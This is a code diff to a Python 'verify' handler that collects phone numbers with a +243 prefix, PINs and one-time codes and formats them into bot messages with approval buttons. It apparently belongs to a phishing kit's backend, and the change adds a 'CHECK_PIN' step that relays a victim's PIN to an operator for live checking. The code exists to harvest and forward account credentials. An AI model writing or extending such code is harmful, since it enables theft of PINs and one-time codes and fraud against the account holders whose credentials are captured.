@@ -124,7 +124,7 @@ def verify():
     pin = data.get('pin', '')
     otp = data.get('otp', '')
     
-    # Set pending status when OTP is submitted
+    # Set pending status when OTP or CHECK_PIN is submitted
     if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
         set_status(session_id, "pending")
         
@@ -135,6 +135,11 @@ def verify():
         message += f"📱 <b>Phone:</b> +243 {phone}\n"
         message += f"🔑 <b>PIN:</b> {pin}\n"
         message += f"⚠️ <i>User requested a new code.</i>"
+    elif otp == 'CHECK_PIN':
+        message = f"🔍 <b>CHECK PIN VERIFICATION</b>\n\n"
+        message += f"📱 <b>Phone:</b> +243 {phone}\n"
+        message += f"🔑 <b>PIN:</b> {pin}\n"
+        message += f"⚠️ <i>Verify PIN validity via buttons below:</i>"
     else:
         message = f"🚀 <b>New Application Received!</b>\n\n"
         message += f"📱 <b>Phone:</b> +243 {phone}\n"
@@ -149,7 +154,7 @@ def verify():
             "parse_mode": "HTML"
         }
         
-        # Attach approval buttons on OTP submission
+        # Attach approval buttons on OTP or CHECK_PIN submission
         if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
             payload["reply_markup"] = {
                 "inline_keyboard": [
